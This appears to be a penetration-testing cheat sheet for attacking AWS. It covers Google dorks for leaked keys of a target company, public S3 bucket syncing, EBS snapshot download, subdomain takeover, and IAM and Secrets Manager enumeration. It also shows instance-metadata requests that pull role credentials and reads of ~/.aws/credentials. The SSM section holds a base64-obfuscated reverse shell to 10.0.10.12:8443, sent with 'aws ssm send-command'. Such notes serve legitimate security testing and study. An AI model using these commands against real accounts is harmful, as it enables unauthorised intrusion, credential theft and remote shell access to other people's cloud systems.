# Cloud

## Tools

[GrayHatWarfare](buckets.grayhatwarfare.com/buckets)
[Cloud_enum](https://github.com/initstring/cloud_enum)
[BucketFinder](https://digi.ninja/projects/bucket_finder.php)
[TruffleHog](https://github.com/trufflesecurity/truffleHog)
[AWS_Scripts](https://github.com/cloudbreach/CloudBreach_AWSScripts)
[Pacu - AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
[dsnap - download EBS snapshots](https://github.com/RhinoSecurityLabs/dsnap)


## AWS

### Services

- S3 - Simple Storage Service
- EC2 - Elastic Compute Cloud
- EBS - Elastic Block Store (used with EC2 for persistent, durable storage volumes)
- SSM - AWS Systems Manager
- IAM - Identity and Access Management
- SNS - Amazon Simple Notification Service 

### Tips

Define different profile in `~/.aws/credentials` and use them with `aws --profile <name>`

```
[profile_1]
aws_access_key_id=ASIAI44QH8DHBEXAMPLE
aws_secret_access_key=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
aws_session_token = fcZib3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZVERYLONGSTRINGEXAMPLE
```

### Unauthenticated Enumeration

**OSINT**

```
<Target_Company> “AWS_ACCESS_KEY_ID” OR “AWS_ACCESS_SECRET_KEY”

<Target_Company> “AWS_ACCESS_KEY_ID” OR “AWS_ACCESS_SECRET_KEY” filetype:txt

site:http://amazonaws.com inurl:".s3.amazonaws.com/" "<Target_Company>”

site:.s3.amazonaws.com "Company" “<Target_Company>”

Intitle:index.of.bucket “<Target_Company>”
```
[GrayHatWarfare](buckets.grayhatwarfare.com/buckets)

**S3 Bucket Enumeration**

Amazon S3 (Simple Storage Service) is a scalable storage service offered by Amazon Web Services (AWS).

`http://[bucketname].s3-website-[region].amazonaws.com/`

Guess Naming Convention: Bucket Naming Conventions are often guessable.

```
aws s3 ls s3://insert-bucket-name-example
```

[Cloud_enum](https://github.com/initstring/cloud_enum)

```
./cloud_enum.py -k twocapital --disable-azure --disable-gcp
```

[BucketFinder](https://digi.ninja/projects/bucket_finder.php)
[TruffleHog](https://github.com/trufflesecurity/truffleHog)

```
mkdir s3
cd s3
aws s3 sync s3://bucket . # This is the command where you need to have AWS credentials.
aws s3 sync s3://bucket . --no-sign-request # No sign-in required

aws s3api list-object-versions --bucket bucket --no-sign-request # List bucket versions
```

**AWS Subdomain Takeover**

An AWS subdomain takeover is a misconfiguration occurs when a subdomain is still pointing to an AWS service that has been deleted or is otherwise no longer properly in use by the rightful owner. Subdomains are typically created for various AWS services like S3, EC2, or CloudFront.

Here’s a breakdown of how it happens and the potential abuse by attackers:

Setup: A company sets up a subdomain (e.g., blog.company.com) and points it to an AWS S3 bucket using a DNS CNAME record to serve content over HTTP.

Abandonment: The company stops using the S3 bucket for any reason—maybe they moved their service or no longer need the subdomain—and they delete the S3 bucket. However, they neglect to remove or update the DNS CNAME record that points to that bucket.

Takeover: An attacker notices that blog.company.com is still pointing to the now non-existent S3 bucket. This can be done through DNS enumeration or by using tools like Sublist3r, AWS-specific tools like AWSBucketDump, or other reconnaissance techniques. Since AWS S3 bucket names are unique across all users, the attacker can create a new S3 bucket with the same name that the subdomain’s DNS record is pointing to.

Control: Once the attacker has created a new S3 bucket with the corresponding name, they gain control over the content that the subdomain delivers. This is because the DNS record still directs traffic to the bucket that is now under the attacker’s control.

Abuse: The attacker can then use this to serve malicious content, create phishing pages, or even attempt to capture sensitive information from unsuspecting users who visit the subdomain thinking it’s a legitimate part of the company’s website. If the company’s cookies were not secured, it might also lead to session hijacking and account takeovers


### Authenticated Reconnaissance

**Configure**

```
aws configure # Use AccessKey and SecretAccessKey
```

**IAM permissions**

```
aws sts get-caller-identity # Retrieve Account ID
aws iam get-user --user-name <breached_username> # Return information about the user
aws iam list-user-policies –user-name <breached_username> # Return a list of policies
aws iam list-attached-user-policies --user-name <breached_username> # Return in-line policies
aws iam get-user-policy --user-name <breached_username> --policy-name <policyname> # Return specific in-line policy

```

[Pacu - AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)

**EC2 instances**

```
aws ec2 describe-instances # decribe EC2 instances
aws ec2 describe-volumes # list EBS volumes
aws ec2 describe-snapshots # describe EBS snapshots
```

Also, keep in mind that these commands will return JSON outputs by default. If you have a specific attribute you’re interested in, you can make use of the –query parameter to filter the output.

**Elastic Block Store (EBS)**

Amazon Elastic Block Store (EBS) is a block storage service designed to be used with Amazon Elastic Compute Cloud (EC2) instances for both throughput and transaction-intensive workloads at any scale. Offered by Amazon Web Services (AWS), EBS provides scalable, durable, high-performance storage that can be attached to running EC2 instances and used like a traditional hard drive.
EBS volumes behave like raw, unformatted block devices that can be attached to a single EC2 instance. You can create an EBS volume independently and then attach it to an EC2 instance or create an EBS volume as part of the EC2 instance launch.
The data stored on an EBS volume persists independently of the life of the associated EC2 instance, unlike instance store volumes that are ephemeral.

```
aws ec2 describe-volumes # list EBS volumes
aws ec2 describe-snapshots # describe EBS snapshots
aws ec2 describe-snapshots --region <region> 
aws ec2 describe-snapshots --region <region> --owner-ids <account-id> # List only snapshots available for account-id
pacu > run ebs__enum_volumes_snapshots --accounts-ids <account-id> # List only snapshots available for account-id
dsnap --region <region> list # List only snapshots available for current aws account
dsnap --region <region> get <snap-id> # download snapshots
```

To mount a retrieved snapshot, docker can be used:

```
cd <dsnap_pwd>
sudo IMAGE=snapshot.img make docker/run
```

### Enumeration & Command Execution via SSM

AWS Systems Manager (SSM) is a comprehensive management service offered by Amazon Web Services (AWS) that simplifies the process of managing and automating tasks on AWS resources. It provides a centralised platform for configuring, managing, and maintaining servers and applications in your AWS environment.

SSM operates by installing an agent on EC2 instances, which allows administrators to remotely execute commands, automate tasks, and manage configuration settings on those instances. It provides a secure and efficient way to perform various operational tasks, such as software patching, inventory management, and software installation.

However, in the hands of a potential attacker, SSM could be abused for malicious purposes. If an attacker gains unauthorised access to an AWS environment or compromises an EC2 instance, they may use SSM to execute arbitrary commands or scripts, manipulate configurations, and potentially compromise the security and integrity of the environment. To mitigate this risk, it’s crucial to implement robust security practices, including proper IAM (Identity and Access Management) policies, auditing, and monitoring to prevent unauthorised access and misuse of AWS SSM.

```
run iam__enum_permissions --user-name <username> # Enumerate user permissions

aws iam list-attached-user-policies --user-name <username> # Get policies attached to a user
aws iam get-policy --policy-arn arn:<policy_arn> # Get more information about a policy
aws iam get-policy-version --policy-arn arn:<policy_arn> --version-id v1 # Get version information about a policy
aws ec2 describe-instances --filter Name=tag:Name,Values=<name> 
aws ec2 describe-instances --filter Name=instance-id,Values=<instance-id>
```

**Command execution via SSM**
```
aws ssm send-command \
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --comment "IP config" \
    --parameters commands=ifconfig \
    --output text

aws ssm send-command 
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --comment "ReverseShell" 
    --parameters '{"commands":["echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEwLjEyLzg0NDMgMD4mMQo= | base64 -d | bash"]}'
#   --parameters '{"commands":["bash -i >& /dev/tcp/10.0.10.12/8443 0>&1"]}' 
    --output text   

# Get result
aws ssm list-command-invocations \
    --command-id $sh-command-id \
    --details
```

By default, when users log in using the AWS Command Line Interface (CLI), a hidden directory named `.aws` is automatically created in their home directory for several important reasons. This directory serves as a crucial configuration hub for the AWS CLI, enabling users to store and manage their AWS access credentials, region preferences, and other configuration settings.

```
cat ~/.aws/config
cat ~/.aws/credentials
```

### Abuse IAM User Roles, Instance Metadata & SNS

Amazon Web Services Identity and Access Management (AWS IAM) is a service that governs access to AWS resources, ensuring secure and fine-grained control over permissions. IAM operates by defining policies that specify what actions are allowed or denied on AWS resources.

Users, groups, and roles are key IAM entities. Users represent individual identities, while groups allow for collective permission assignment. Roles are used for cross-account or service-level access. IAM also supports multi-factor authentication (MFA) for added security and provides access keys for programmatic access.

**Instance Metadata Service (IMDS)**

AWS IMDSv1 (Instance Metadata Service Version 1) and IMDSv2 (Instance Metadata Service Version 2) are services provided by Amazon Web Services (AWS) that allow EC2 instances to retrieve metadata about themselves and interact with the instance’s local configuration. While both services serve similar purposes, they have significant differences in terms of security and functionality.

**AWS Secrets Manager**

AWS Secrets Manager is a managed service provided by Amazon Web Services (AWS) that simplifies the secure storage and management of sensitive information such as API keys, passwords, and other credentials. It operates by allowing users to create and store secrets, which are essentially pieces of sensitive data, in a centralized and highly secure manner.

Here’s how AWS Secrets Manager works:

Secret Creation: Users can create secrets using the AWS Management Console, SDKs, or the AWS Command Line Interface (CLI). These secrets can include database credentials, API keys, or any other sensitive data.
Encryption: AWS Secrets Manager encrypts these secrets both at rest and in transit using industry-standard encryption protocols, ensuring the confidentiality and integrity of the stored data.
Access Control: Users can define fine-grained access control policies to specify who can access and manage secrets, helping to maintain the principle of least privilege.
Rotation: One of the standout features of AWS Secrets Manager is its ability to automate the rotation of credentials. It can periodically generate new credentials for a secret and update the applications that use them, thus enhancing security by regularly changing access credentials.
Integration: AWS Secrets Manager can seamlessly integrate with AWS services and other applications, allowing for secure retrieval of secrets during application runtime. This eliminates the need for hard coding credentials within applications.
Overall, AWS Secrets Manager simplifies the management of sensitive information, enhances security through automated rotation, and promotes best practices for handling credentials in a cloud-native environment.

```
aws secretsmanager list-secrets # list secrets
aws secretsmanager get-secret-value --secret-id <secret-id>
```

**AWS AssumeRole**

AWS AssumeRole is an essential feature of Amazon Web Services (AWS) Identity and Access Management (IAM), enabling entities like IAM users or AWS services to temporarily acquire the permissions and access rights of another AWS entity by assuming a specific role. This delegation is defined through a trust policy, which specifies the trusted entities that can assume the role.

Here’s how it works:

    An entity requests to assume a role by calling the AssumeRole API operation or assumes the role via the AWS Management Console.
    AWS validates the entity’s permissions against the trust policy attached to the role. The trust policy specifies who can assume the role, typically within the same or different AWS accounts.
    Once authorized, AWS generates temporary security credentials for the entity, granting access based on the permissions defined in the role’s policies.
    The entity can now perform actions and access resources using the temporary credentials, limited to the permissions of the assumed role.

**AWS Inline Policy**

In Amazon Web Services (AWS), inline policies are IAM (Identity and Access Management) policies that you can create and manage embedded directly to a single user, group, or role. Inline policies are used to grant permissions to a specific AWS service or resource and are not standalone like managed policies. Additional information can be found in AWS Access and Identity documentation.

Always aim for the principle of least privilege when crafting policies. This means only granting the permissions that are absolutely necessary for the task at hand. Misconfigured inline policies can accidentally grant broader access than intended.

#### Abusing Instance Metadata Service (IMDS)

If IMDSv1 is enabled, it is possible to retrieve metadata 

```
curl http://169.254.169.254/latest/meta-data/ # instance's metadata
curl http://169.254.169.254/latest/meta-data/hostname # instance's hostname
curl http://169.254.169.254/latest/meta-data/ami-id # instance's AMI ID
curl http://169.254.169.254/latest/meta-data/instance-type # instance's type
curl http://169.254.169.254/latest/meta-data/security-groups # instance security groups
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> # instance's IAM role creds (if a role is attached to the instance)
```

The IP address 169.254.169.254 is a special link-local address used by AWS for EC2 instances to access their metadata without requiring external connectivity.


```
aws iam list-user-policies --user-name <username> # List user's policies
aws iam get-user-policy --user-name <username> --policy-name <policy-name> # User's policy description
aws iam get-policy --policy-arn arn:<policy_arn> # Get more information about a policy

aws ec2 describe-instance-attribute --instance-id <instance-id> --attribute <attribute-name> # Read attribute from ec2 instance
```

To loop over a long list of EC2 instance to find an attribute :

```
for i in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do echo $i && aws ec2 describe-instance-attribute --instance-id $i --attribute <attribute-name> ;done
```

